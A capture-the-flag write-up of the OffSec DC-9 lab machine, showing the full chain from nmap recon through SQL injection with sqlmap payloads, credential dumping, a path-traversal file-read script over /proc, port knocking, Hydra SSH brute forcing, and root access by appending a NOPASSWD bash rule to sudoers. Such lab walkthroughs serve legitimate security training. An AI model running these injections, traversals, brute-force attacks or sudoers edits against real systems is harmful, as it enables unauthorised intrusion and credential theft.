---
layout: post
title: "[Offsec] DC-9 writeup"
categories: ctf offsec oscp
---

## Introduction

The challenge can be found at: [Offsec Labs Play](https://portal.offsec.com/labs/play)

![offsec](/assets/images/dc9/offsec.png)

## Recon

We start with an nmap scan as usual:

```
> sudo nmap -v -AO -sC -p- 192.168.189.209                                                                                           ~/Projects/OffSec/Labs/DC-9@homes5
[sudo] password for rzy:
Starting Nmap 7.95 ( https://nmap.org ) at 2024-06-25 03:58 CDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 03:58
Completed NSE at 03:58, 0.00s elapsed
Initiating NSE at 03:58
Completed NSE at 03:58, 0.00s elapsed
Initiating NSE at 03:58
Completed NSE at 03:58, 0.00s elapsed
Initiating Ping Scan at 03:58
Scanning 192.168.189.209 [4 ports]
Completed Ping Scan at 03:58, 0.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 03:58
Completed Parallel DNS resolution of 1 host. at 03:58, 0.00s elapsed
Initiating SYN Stealth Scan at 03:58
Scanning 192.168.189.209 [65535 ports]
Discovered open port 80/tcp on 192.168.189.209
Completed SYN Stealth Scan at 03:58, 33.74s elapsed (65535 total ports)
Initiating Service scan at 03:58
Scanning 1 service on 192.168.189.209
Completed Service scan at 03:58, 6.12s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 192.168.189.209
Retrying OS detection (try #2) against 192.168.189.209
Retrying OS detection (try #3) against 192.168.189.209
Retrying OS detection (try #4) against 192.168.189.209
Retrying OS detection (try #5) against 192.168.189.209
Initiating Traceroute at 03:58
Completed Traceroute at 03:58, 0.05s elapsed
Initiating Parallel DNS resolution of 4 hosts. at 03:58
Completed Parallel DNS resolution of 4 hosts. at 03:58, 0.00s elapsed
NSE: Script scanning 192.168.189.209.
Initiating NSE at 03:58
Completed NSE at 03:58, 0.96s elapsed
Initiating NSE at 03:58
Completed NSE at 03:58, 0.19s elapsed
Initiating NSE at 03:58
Completed NSE at 03:58, 0.00s elapsed
Nmap scan report for 192.168.189.209
Host is up (0.042s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Example.com - Staff Details - Welcome
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/25%OT=80%CT=1%CU=42938%PV=Y%DS=4%DC=T%G=Y%TM=667A86C
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10D%TI=Z%II=I%TS=A)SEQ(SP=1
OS:04%GCD=1%ISR=10B%TI=Z%II=I%TS=A)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%II=I%TS=A)
OS:SEQ(SP=105%GCD=1%ISR=105%TI=Z%II=I%TS=A)SEQ(SP=F9%GCD=1%ISR=10B%TI=Z%II=
OS:I%TS=A)OPS(O1=M551ST11NW7%O2=M551ST11NW7%O3=M551NNT11NW7%O4=M551ST11NW7%
OS:O5=M551ST11NW7%O6=M551ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W
OS:6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M551NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=
OS:O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F
OS:=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=C0E3%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
OS:=G%RUCK=C1E3%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RU
OS:CK=C2E3%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=C3
OS:E3%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=C4E3%RU
OS:D=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.295 days (since Mon Jun 24 20:53:27 2024)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   42.79 ms 192.168.45.1
2   42.77 ms 192.168.45.254
3   43.82 ms 192.168.251.1
4   44.16 ms 192.168.189.209

NSE: Script Post-scanning.
Initiating NSE at 03:58
Completed NSE at 03:58, 0.00s elapsed
Initiating NSE at 03:58
Completed NSE at 03:58, 0.00s elapsed
Initiating NSE at 03:58
Completed NSE at 03:58, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.62 seconds
           Raw packets sent: 65757 (2.898MB) | Rcvd: 65602 (2.628MB)
```

Let's open the web page at port 80. We are welcomed with a simple page.

![search](/assets/images/dc9/search.png)

Let's scan the page for interesting paths:

```
> gobuster dir -w /usr/share/dirbuster-ng/wordlists/big.txt -u http://192.168.193.209
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.193.209
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster-ng/wordlists/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/                     (Status: 200) [Size: 917]
/css                  (Status: 301) [Size: 316] [--> http://192.168.193.209/css/]
/includes             (Status: 301) [Size: 321] [--> http://192.168.193.209/includes/]
Progress: 4218 / 4219 (99.98%)
===============================================================
Finished
===============================================================
```

Nothing seems interesting, let's try `sqlmap` for SQL Injection bugs:

```
> sqlmap --method POST --data="search=a" -u http://192.168.193.209/results.php --random-agent
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.6.3#dev}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:19:48 /2024-07-02/

[19:19:48] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)' from file '/opt/sqlmap/data/txt/user-agents.txt'
[19:19:49] [INFO] resuming back-end DBMS 'mysql' 
[19:19:49] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=a' AND (SELECT 4029 FROM (SELECT(SLEEP(5)))mJOS) AND 'BnVy'='BnVy

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: search=a' UNION ALL SELECT CONCAT(0x716a7a7871,0x434b4a754e4e67724276577a7273516c6a4e715756486d6d5968424c71614d4152484a5845536169,0x7176706271),NULL,NULL,NULL,NULL,NULL-- -
---
[19:19:49] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL 5 (MariaDB fork)
[19:19:49] [INFO] fetched data logged to text files under '/home/rzy/.local/share/sqlmap/output/192.168.193.209'

[*] ending @ 19:19:49 /2024-07-02/
```

Great, it's vulnerable to time-based and most importantly, UNION based SQLi. Let's dump tables and contents insides of it. This can be done via either manual or sqlmap.

![burp](/assets/images/dc9/burp.png)

```
> sqlmap --method POST --data="search=a" -u http://192.168.193.209/results.php --random-agent --dbs
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.6.3#dev}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:23:44 /2024-07-02/

[19:23:44] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.10) Gecko/20070530 Firefox/1.0.4 (Debian package 1.0.4-2sarge17)' from file '/opt/sqlmap/data/txt/user-agents.txt'
[19:23:44] [INFO] resuming back-end DBMS 'mysql' 
[19:23:44] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=a' AND (SELECT 4029 FROM (SELECT(SLEEP(5)))mJOS) AND 'BnVy'='BnVy

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: search=a' UNION ALL SELECT CONCAT(0x716a7a7871,0x434b4a754e4e67724276577a7273516c6a4e715756486d6d5968424c71614d4152484a5845536169,0x7176706271),NULL,NULL,NULL,NULL,NULL-- -
---
[19:23:44] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL 5 (MariaDB fork)
[19:23:44] [INFO] fetching database names
available databases [3]:
[*] information_schema
[*] Staff
[*] users

[19:23:44] [INFO] fetched data logged to text files under '/home/rzy/.local/share/sqlmap/output/192.168.193.209'

[*] ending @ 19:23:44 /2024-07-02/
```

```
> sqlmap --method POST --data="search=a" -u http://192.168.193.209/results.php --random-agent --dbms=mysql -D Staff --dump
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.6.3#dev}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:25:36 /2024-07-02/

[19:25:36] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.7.6) Gecko/20050225 Firefox/1.0.1' from file '/opt/sqlmap/data/txt/user-agents.txt'
[19:25:36] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=a' AND (SELECT 4029 FROM (SELECT(SLEEP(5)))mJOS) AND 'BnVy'='BnVy

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: search=a' UNION ALL SELECT CONCAT(0x716a7a7871,0x434b4a754e4e67724276577a7273516c6a4e715756486d6d5968424c71614d4152484a5845536169,0x7176706271),NULL,NULL,NULL,NULL,NULL-- -
---
[19:25:36] [INFO] testing MySQL
[19:25:36] [INFO] confirming MySQL
[19:25:36] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[19:25:36] [INFO] fetching tables for database: 'Staff'
[19:25:36] [INFO] fetching columns for table 'StaffDetails' in database 'Staff'
[19:25:36] [INFO] fetching entries for table 'StaffDetails' in database 'Staff'
Database: Staff
Table: StaffDetails
[17 entries]
+----+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+
| id | email                 | phone          | lastname   | reg_date            | firstname | position                      |
+----+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+
| 1  | marym@example.com     | 46478415155456 | Moe        | 2019-05-01 17:32:00 | Mary      | CEO                           |
| 2  | julied@example.com    | 46457131654    | Dooley     | 2019-05-01 17:32:00 | Julie     | Human Resources               |
| 3  | fredf@example.com     | 46415323       | Flintstone | 2019-05-01 17:32:00 | Fred      | Systems Administrator         |
| 4  | barneyr@example.com   | 324643564      | Rubble     | 2019-05-01 17:32:00 | Barney    | Help Desk                     |
| 5  | tomc@example.com      | 802438797      | Cat        | 2019-05-01 17:32:00 | Tom       | Driver                        |
| 6  | jerrym@example.com    | 24342654756    | Mouse      | 2019-05-01 17:32:00 | Jerry     | Stores                        |
| 7  | wilmaf@example.com    | 243457487      | Flintstone | 2019-05-01 17:32:00 | Wilma     | Accounts                      |
| 8  | bettyr@example.com    | 90239724378    | Rubble     | 2019-05-01 17:32:00 | Betty     | Junior Accounts               |
| 9  | chandlerb@example.com | 189024789      | Bing       | 2019-05-01 17:32:00 | Chandler  | President - Sales             |
| 10 | joeyt@example.com     | 232131654      | Tribbiani  | 2019-05-01 17:32:00 | Joey      | Janitor                       |
| 11 | rachelg@example.com   | 823897243978   | Green      | 2019-05-01 17:32:00 | Rachel    | Personal Assistant            |
| 12 | rossg@example.com     | 6549638203     | Geller     | 2019-05-01 17:32:00 | Ross      | Instructor                    |
| 13 | monicag@example.com   | 8092432798     | Geller     | 2019-05-01 17:32:00 | Monica    | Marketing                     |
| 14 | phoebeb@example.com   | 43289079824    | Buffay     | 2019-05-01 17:32:02 | Phoebe    | Assistant Janitor             |
| 15 | scoots@example.com    | 454786464      | McScoots   | 2019-05-01 20:16:33 | Scooter   | Resident Cat                  |
| 16 | janitor@example.com   | 65464646479741 | Trump      | 2019-12-23 03:11:39 | Donald    | Replacement Janitor           |
| 17 | janitor2@example.com  | 47836546413    | Morrison   | 2019-12-24 03:41:04 | Scott     | Assistant Replacement Janitor |
+----+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+

[19:25:36] [INFO] table 'Staff.StaffDetails' dumped to CSV file '/home/rzy/.local/share/sqlmap/output/192.168.193.209/dump/Staff/StaffDetails.csv'
[19:25:36] [INFO] fetching columns for table 'Users' in database 'Staff'
[19:25:37] [INFO] fetching entries for table 'Users' in database 'Staff'
[19:25:38] [INFO] recognized possible password hashes in column 'Password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: Staff
Table: Users
[1 entry]
+--------+----------------------------------+----------+
| UserID | Password                         | Username |
+--------+----------------------------------+----------+
| 1      | 856f5de590ef37314e7c3bdf6f8a66dc | admin    |
+--------+----------------------------------+----------+

[19:25:41] [INFO] table 'Staff.Users' dumped to CSV file '/home/rzy/.local/share/sqlmap/output/192.168.193.209/dump/Staff/Users.csv'
[19:25:41] [INFO] fetched data logged to text files under '/home/rzy/.local/share/sqlmap/output/192.168.193.209'

[*] ending @ 19:25:41 /2024-07-02/

> sqlmap --method POST --data="search=a" -u http://192.168.193.209/results.php --random-agent --dbms=mysql -D users --dump
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.6.3#dev}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:27:33 /2024-07-02/

[19:27:33] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0' from file '/opt/sqlmap/data/txt/user-agents.txt'
[19:27:33] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=a' AND (SELECT 4029 FROM (SELECT(SLEEP(5)))mJOS) AND 'BnVy'='BnVy

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: search=a' UNION ALL SELECT CONCAT(0x716a7a7871,0x434b4a754e4e67724276577a7273516c6a4e715756486d6d5968424c71614d4152484a5845536169,0x7176706271),NULL,NULL,NULL,NULL,NULL-- -
---
[19:27:33] [INFO] testing MySQL
[19:27:33] [INFO] confirming MySQL
[19:27:33] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[19:27:33] [INFO] fetching tables for database: 'users'
[19:27:34] [INFO] fetching columns for table 'UserDetails' in database 'users'
[19:27:34] [INFO] fetching entries for table 'UserDetails' in database 'users'
Database: users
Table: UserDetails
[17 entries]
+----+------------+---------------+---------------------+-----------+-----------+
| id | lastname   | password      | reg_date            | username  | firstname |
+----+------------+---------------+---------------------+-----------+-----------+
| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |
| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |
| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |
| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |
| 5  | Cat        | TC&TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |
| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |
| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |
| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |
| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |
| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |
| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |
| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |
| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |
| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |
| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |
| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |
| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |
+----+------------+---------------+---------------------+-----------+-----------+

[19:27:34] [INFO] table 'users.UserDetails' dumped to CSV file '/home/rzy/.local/share/sqlmap/output/192.168.193.209/dump/users/UserDetails.csv'
[19:27:34] [INFO] fetched data logged to text files under '/home/rzy/.local/share/sqlmap/output/192.168.193.209'

[*] ending @ 19:27:34 /2024-07-02/
```

First off, table `Staff.Users` contains admin password in MD5 form. Let's try to crack it with online databases. My favourite one is [CrackStation](https://crackstation.net/).

![crack](/assets/images/dc9/crack.png)

After loggin in, we will see the admin interface. Can you notice something weird about the interface? 

![admin](/assets/images/dc9/admin.png)

![add](/assets/images/dc9/admin_add.png)

The "File does not exist" suggests a parameter to read a file. And it sure works.

![lfi](/assets/images/dc9/lfi.png)

Notice that all usernames exist in `users.UserDetails`, so we might be able to use the passwords there to bruteforce. But port 22 on this machine was filtered.

## Open the filtered port

There are many ways to filter a port on a Linux machine. But we can narrow down the options as we already knew the OS was Debian 10. Furthermore, these challenges are (almost) all about compromise the machines, not the firewall outside. So we can be sure that the mechanism that handles port filtering is inside the Debian GNU/Linux box.

How about trying to enumerate processes on this machine? We can't run `ps aux` for sure. But we can enumerate all processes under `/proc`. Let's write a quick script to do that.

```python
from requests import get

cookies = {
    'PHPSESSID': '4lpjj8d1b4nagjk18k32acdr9m',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'en-US',
    'Cache-Control': 'max-age=0',
    # 'Cookie': 'PHPSESSID=4lpjj8d1b4nagjk18k32acdr9m',
    'Proxy-Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36',
}

for pid in range(10000):
    response = get(
        f'http://192.168.193.209/manage.php?file=../../../../proc/{pid}/cmdline',
        cookies=cookies,
        headers=headers,
        verify=False,
    )
    if "File does not exist<br />/" in response.text:
        start = response.text.find("File does not exist<br />/")
        end = response.text.find("</footer>")
        print(response.text[start:end])
    else:
        print(f"no process with pid = {pid}")
```

We got something relevant. `knockd` is a service used for port knocking. Let's also check for its configuration.

```
...
no process with pid = 1235
no process with pid = 1236
no process with pid = 1237
no process with pid = 1238
File does not exist<br />/usr/sbin/knockd-ieth0                 </div>

no process with pid = 1240
no process with pid = 1241
no process with pid = 1242
no process with pid = 1243
no process with pid = 1244
no process with pid = 1245
...
```

![knockd](/assets/images/dc9/knockd.png)

And finally we knock the ports with the correct sequence.

```
> knock -v -d 25 192.168.193.209 7469 8475 9842
hitting tcp 192.168.193.209:7469
hitting tcp 192.168.193.209:8475
hitting tcp 192.168.193.209:9842
> nc 192.168.193.209 22
SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1

```

Perfect, now we use the extracted usernames and passwords for cracking SSH.

```
> hydra -t 40 192.168.193.209 ssh -I -L usernames.txt -P pass.txt
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-02 21:35:11
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 40 tasks per 1 server, overall 40 tasks, 306 login tries (l:17/p:18), ~8 tries per task
[DATA] attacking ssh://192.168.193.209:22/
[22][ssh] host: 192.168.193.209   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.193.209   login: joeyt   password: Passw0rd
[22][ssh] host: 192.168.193.209   login: janitor   password: Ilovepeepee
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-02 21:36:00
```

After logging in as `janitor`.

```
janitor@dc-9:~$ pwd
/home/janitor
janitor@dc-9:~$ ls -lah
total 16K
drwx------  4 janitor janitor 4.0K Jul  4 19:29 .
drwxr-xr-x 19 root    root    4.0K Dec 29  2019 ..
lrwxrwxrwx  1 janitor janitor    9 Dec 29  2019 .bash_history -> /dev/null
drwx------  3 janitor janitor 4.0K Jul  4 19:29 .gnupg
drwx------  2 janitor janitor 4.0K Dec 29  2019 .secrets-for-putin
janitor@dc-9:~$ cat .secrets-for-putin/passwords-found-on-post-it-notes.txt
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
```

We have another list of passwords to bruteforce even more.

```
> hydra -t 40 192.168.238.209 ssh -I -L usernames.txt -P pass2.txt
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-04 04:31:37
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 40 tasks per 1 server, overall 40 tasks, 119 login tries (l:17/p:7), ~3 tries per task
[DATA] attacking ssh://192.168.238.209:22/
[22][ssh] host: 192.168.238.209   login: fredf   password: B4-Tru3-001
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-04 04:31:51
```

```
> ssh fredf@192.168.238.209
fredf@192.168.238.209's password: 
Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul  4 19:32:27 2024 from 192.168.45.159
fredf@dc-9:~$ ls
local.txt
fredf@dc-9:~$ cat local.txt 
9ead8110e7cc15c72efc718fec950c54
```

## Privilege escalation

```
fredf@dc-9:~$ sudo -l
Matching Defaults entries for fredf on dc-9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/dist/test/test
fredf@dc-9:~$ file /opt/devstuff/dist/test/test
/opt/devstuff/dist/test/test: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=28ba79c778f7402713aec6af319ee0fbaf3a8014, stripped
fredf@dc-9:~$ cd /opt/devstuff/dist/test/
fredf@dc-9:/opt/devstuff/dist/test$ ls
base_library.zip                                 libbz2.so.1.0         _lzma.cpython-37m-x86_64-linux-gnu.so
_bz2.cpython-37m-x86_64-linux-gnu.so             libcrypto.so.1.1      _multibytecodec.cpython-37m-x86_64-linux-gnu.so
_codecs_cn.cpython-37m-x86_64-linux-gnu.so       libexpat.so.1         _opcode.cpython-37m-x86_64-linux-gnu.so
_codecs_hk.cpython-37m-x86_64-linux-gnu.so       liblzma.so.5          readline.cpython-37m-x86_64-linux-gnu.so
_codecs_iso2022.cpython-37m-x86_64-linux-gnu.so  libpython3.7m.so.1.0  resource.cpython-37m-x86_64-linux-gnu.so
_codecs_jp.cpython-37m-x86_64-linux-gnu.so       libreadline.so.7      _ssl.cpython-37m-x86_64-linux-gnu.so
_codecs_kr.cpython-37m-x86_64-linux-gnu.so       libssl.so.1.1         termios.cpython-37m-x86_64-linux-gnu.so
_codecs_tw.cpython-37m-x86_64-linux-gnu.so       libtinfo.so.6         test
_hashlib.cpython-37m-x86_64-linux-gnu.so         libz.so.1
fredf@dc-9:/opt/devstuff/dist/test$ ./test 
Usage: python test.py read append
fredf@dc-9:/opt/devstuff/dist/test$ 
```

So this user can execute `/opt/devstuff/dist/test/test` as root. Notice that the folder contains shared libraries of Python, and the help message suggests a python script. This is a clear sign of a compiled python script. And sure it is.

```
fredf@dc-9:/opt/devstuff$ cat test.py 
#!/usr/bin/python

import sys

if len (sys.argv) != 3 :
    print ("Usage: python test.py read append")
    sys.exit (1)

else :
    f = open(sys.argv[1], "r")
    output = (f.read())

    f = open(sys.argv[2], "a")
    f.write(output)
    f.close()
```

So we know that we can basically append to any file as root. There are many ways to get root, for example let's append the sudoers file.

```
fredf@dc-9:/etc/sudoers.d$ echo "fredf   ALL=(root) NOPASSWD: /usr/bin/bash" > /tmp/conf
fredf@dc-9:/etc/sudoers.d$ sudo /opt/devstuff/dist/test/test /tmp/conf /etc/sudoers.d/template
fredf@dc-9:/etc/sudoers.d$ sudo /usr/bin/bash
root@dc-9:/etc/sudoers.d# id
uid=0(root) gid=0(root) groups=0(root)
root@dc-9:/etc/sudoers.d# cd /root
root@dc-9:~# ls
proof.txt
root@dc-9:~# cat proof.txt 
92c099c595872e4d21927ae710866e38
```